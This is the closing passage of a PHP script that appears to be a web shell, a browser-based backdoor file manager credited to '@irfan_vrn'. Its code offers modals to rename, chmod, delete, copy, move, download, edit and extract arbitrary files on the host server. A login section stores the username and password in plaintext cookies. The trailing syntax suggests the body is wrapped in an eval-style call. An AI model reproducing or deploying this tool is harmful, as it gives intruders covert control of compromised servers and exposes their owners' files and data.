           <div class="modal-content">
 	          <div class="modal-header">
 	          <h5 class="modal-title">Rename : '.$filename.'</h5>
  	         <button type="button" class="close" data-dismiss="modal" aria-label="Close">
  	         <span aria-hidden="true">&times;</span>
  	         </button>
   	        </div>
           <div class="modal-body">
           <form method="POST" action ="">  
 			          <p><center><b>Rename to : 
           </b><br><br>
  	         <input type="hidden" name="oldFile" value="'.$fileloc.'">
           <input type="hidden" name="filePath" value="'.$filepath.'">
           <input type="text" pattern=".{1,}" required title="1 characters minimum" name="newFile" class="form-control" placeholder="New Name">
 		          <br>
 		          <button type="submit" class="btn btn-warning rounded-0">Rename</button>
           <br>
           </form>
           </center>
 		          </div>
           <div class="modal-footer">
  	         <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
  	         </div>
  	         </div>
   		        </div>
           </div>';
           }
           
           else if($option == "chmod"){
           echo '
  				         <script>
  	         $(document).ready(function(){
   	        $("#chmodFile").modal("show");
    	       });
           </script>
 	          <div id="chmodFile" class="modal" tabindex="-1" role="dialog">
  	         <div class="modal-dialog" role="document">
 	          <div class="modal-content">
   	        <div class="modal-header">
  		         <h5 class="modal-title">Chmod : '.$filename.'</h5>
           <button type="button" class="close" data-dismiss="modal" aria-label="Close">
   	   	     <span aria-hidden="true">&times;</span>
   	        </button>
   	        </div>
           <div class="modal-body">
   			        <form method="POST" action ="">  
           <p><center><b>Chmod to : 
 	 	         </b><br><br>
           <input type="hidden" name="chmodFile" value="'.$fileloc.'">
 	          <input type="hidden" name="chmodPathFile" value="'.$filepath.'">
 		          <input type="text" name="newChmodFile" class="form-control" value="'.substr(sprintf("%o", fileperms($fileloc)), -4).'">
   	        <br>
           <button type="submit" class="btn btn-warning rounded-0">Chmod</button>
           <br>
           </form>
  	         </center>
  	         </div>
   	        <div class="modal-footer">
   			        <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
           </div>
   		        </div>
           </div>
           </div>';
           }
           else if($option == "delete"){
           echo '<script>
 			          $(document).ready(function(){
  	         $("#deleteFile").modal("show");
           });
	           </script>
 			          <div id="deleteFile" class="modal" tabindex="-1" role="dialog">
 	          <div class="modal-dialog" role="document">
  			         <div class="modal-content">
 				          <div class="modal-header">
 	          <h5 class="modal-title">Delete : '.$filename.'</h5>
           <button type="button" class="close" data-dismiss="modal" aria-label="Close">
   		        <span aria-hidden="true">&times;</span>
           </button>
  			         </div>
           <div class="modal-body">
  			         <form method="POST" action="">
  			         <center><h2>Are you sure ?</h2></center>
   	        <input type="hidden" name="delfile" value="'.$fileloc.'">
   	        </div>
   	        <div class="modal-footer">
    		       <button type="submit" name="deletefile" class="btn btn-primary rounded-0">Yes</button></form>
           <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">No</button>
           </div>
     	      </div>
           </div>
           </div>';
           
           }
         else if ($option == "copy"){
                echo '
                          <script>
                 $(document).ready(function(){
                          $("#copyFile").modal("show");
                        });
                   </script>
                      <div id="copyFile" class="modal" tabindex="-1" role="dialog">
                   <div class="modal-dialog" role="document">
                       <div class="modal-content">
                      <div class="modal-header">
                       <h5 class="modal-title">Copy : '.$filename.'</h5>
                          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                              </button>
                     </div>
                          <div class="modal-body">
                  <form method="POST" action ="">  
                          <p><center><b>Copy As : 
                          </b><br><br>
               <input type="hidden" name="oldFileName" value="'.$fileloc.'">
                     <input type="hidden" name="oldFilePath" value="'.$filepath.'">
                    <input type="hidden" name="CopyName" value"'.$filename.'">
             	        <input type="text" pattern=".{1,}" required title="1 characters minimum" name="newFileName" class="form-control" placeholder="Example : FileName.txt">
                          <br>  <br>
                       <p><b>Destination Path :</b><br><br>
                 <input type="text" name="copyToPath" class="form-control" placeholder="Empty this field if you want to copy here">       
                            <br><button type="submit" class="btn btn-warning rounded-0">Copy</button>
                          </center>
                          </div>
                     <div class="modal-footer">
              <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
                          </div>
               </div>
                     </div>
                          </div>
              ';
         }
       else if($option == "move"){
            echo '<script>
      			      $(document).ready(function(){
            $("#moveFile").modal("show");
        		    });
      			      </script>
      		      <div id="moveFile" class="modal" tabindex="-1" role="dialog">
       	     <div class="modal-dialog" role="document">
            <div class="modal-content">
       	     <div class="modal-header">
       	 	    <h5 class="modal-title">Move : '.$filename.'</h5>
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
            </button>
          		  </div>
            <div class="modal-body">
            <form method="POST" action ="">  
       		     <p><center><b>Move To : 
            </b><br><br>
         		   <input type="hidden" name="moveDirFrom" value="'.$fileloc.'">
        <input type="hidden" name="moveFilePath" value="'.$filepath.'">
            <input type="hidden" name="moveFileName" value="'.$filename.'">
        <input type="text" name="moveDirTo" pattern=".{1,}" required title="1 characters minimum" class="form-control" placeholder="Example : /home/thevale/move/here ">
            <br>
 	        <button type="submit" class="btn btn-warning rounded-0">Move</button>
            </form> 	       		       
      		      </br>
            </center>
    		 	       </div>
     		       <div class="modal-footer">
     	       <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
            </div>
          		  </div>
      	      </div>
            </div>';
       }
     else if($option == "download"){
                $fsize = $_POST['fsize'];
                 echo '
            				       <script>
            		       $(document).ready(function(){
              	     $("#downloadFile").modal("show");
                 });
                   </script>
             					      <div id="downloadFile" class="modal" tabindex="-1" role="dialog">
                   <div class="modal-dialog" role="document">
              				     <div class="modal-content">
              	     <div class="modal-header">
            	       <h5 class="modal-title">Download : '.$filename.' ['.$fsize.']</h5>
             			      <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                   <span aria-hidden="true">&times;</span>
             	      </button>
                   </div>
            		       <div class="modal-body">
                			   <form method="POST" action ="">  
                   <center>               
                   <input type="hidden" name="FileLoc" value="'.$fileloc.'"> 
                   <input type="hidden" name="FileName" value="'.$filename.'">                                               
                   <button type="submit" class="btn btn-warning rounded-0">Download</button>
                   <br>
                    </form>
                      </center>
              	     </div>
                <div class="modal-footer">
              	     <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
                   </div>
                	   </div>
                   </div>
              	   </div>
                 ';
            }
       else if($option == "edit"){
          $filecontent = file_get_contents($fileloc);
              echo '
      			        <script>
      			    $(document).ready(function(){
      			        $("#editFile").modal("show");
      			        });
      		    </script>
      			        <div id="editFile" class="modal" tabindex="-1" role="dialog">
      		  <div class="modal-dialog modal-dialog-scrollable" role="document">
      			    	    <div class="modal-content">
      		    <div class="modal-header">
      			   <h5 class="modal-title">FileName : '.$filename.'</h5>
      			        </div>
      			     	   <div class="modal-body">  
      			     	   <form method="POST" action="">    					                            
      				        <br><center>
      				          <input type="hidden" name="editLoc" value="'.$fileloc.'">
      				            <textarea name="editTo" class="form-control" rows="35">'.htmlspecialchars($filecontent).'</textarea>
      				         </center>      				        
      			        </div>
      				        <div class="modal-footer">
      				        <button type="submit" class="btn btn-primary rounded-0">Save</button>      				        
      					        <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
      					          </form>
      				        </div>
      			        </div>
      			  		      </div>
      			        </div>
              ';
       }
          else if($option == "untar"){
      			         echo '<script>
               $(document).ready(function(){
       		        $("#unTar").modal("show");
        	       });
      ; 	        </script>
       	        <div id="unTar" class="modal" tabindex="-1" role="dialog">
       		        <div class="modal-dialog" role="document">
       			        <div class="modal-content">
         	      <div class="modal-header">
               <h5 class="modal-title">Extract : '.$filename.'</h5>
               <button type="button" class="close" data-dismiss="modal" aria-label="Close">
       		        <span aria-hidden="true">&times;</span>
      	         </button>
               </div>
               <div class="modal-body">
       	        <form method="POST" action ="">  
       	        <p><center><b>Extract To : 
           	    </b><br><br>
               <input type="hidden" name="tarLoc" value="'.$fileloc.'">
        		       <input type="hidden" name="tarPath" value="'.$filepath.'">
       	        <input type="hidden" name="tarName" value="'.$filename.'">
               <input type="text" name="tarTo" class="form-control" placeholder="Empty this field if you want to Extract here">
       	 		       <br>
              		 <button type="submit" class="btn btn-warning rounded-0">Extract</button>
          	     </form> 	       		       
        			       </br>
               </center>
        	       </div>
        			       <div class="modal-footer">
               <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
         		      </div>
          	     </div>
            	  	 </div>
               </div>';
         }
       else if($option == "unzip"){ 
             echo '
          		  	     <script>
                 $(document).ready(function(){
                 $("#unZip").modal("show");
                 });
             		    ; 	        </script>
        		         <div id="unZip" class="modal" tabindex="-1" role="dialog">
         	        <div class="modal-dialog" role="document">
          		       <div class="modal-content">
           	      <div class="modal-header">
                 <h5 class="modal-title">Extract : '.$filename.'</h5>
           	      <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                 <span aria-hidden="true">&times;</span>
      	           </button>
         	        </div>
                 <div class="modal-body">
        	         <form method="POST" action ="">  
                 <p><center><b>Extract To : 
                 </b><br><br>
            	     <input type="hidden" name="zipLoc" value="'.$fileloc.'">
                 <input type="hidden" name="zipPath" value="'.$filepath.'">
       	  		        <input type="hidden" name="zipName" value="'.$filename.'">
                 <input type="text" name="zipTo" class="form-control" placeholder="Empty this field if you want to Extract here">
                 <br>
                 <button type="submit" class="btn btn-warning rounded-0">Extract</button>
             	    </form> 	       		       
       	          </br>
                 </center>
        			         </div>
                 <div class="modal-footer">
                 <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
           		      </div>
                 </div>
                	 </div>
                 </div>
             ';             
       }
    }
        }
       
else {}

echo '
<hr /><br><br>
<div class="futer">
<footer id="footer" class="bg-dark">
<div class="footer-copyright text-center py-3"><center>
<font style="color:white;"><b>Copyright 2019 - @irfan_vrn</b></font></center>
</div></footer></div>';
 }

else {
      echo $form;
      if(isset($_POST['uname']) && isset($_POST['pass'])){
              if(($_POST['uname'] == $_SESSION['username']) && ($_POST['pass'] == $_SESSION['password'])){
                     setcookie("yourusername",$_SESSION['username'],time()+10800);
                     setcookie("yourpassword",$_SESSION['password'],time()+10800);                     
                     header('Location: '.$_SERVER['REQUEST_URI']);
                     }
 
           else {
                 echo "<script>alert('WRONG USERNAME / PASSWORD');</script>";
           }
   }
}"));

?>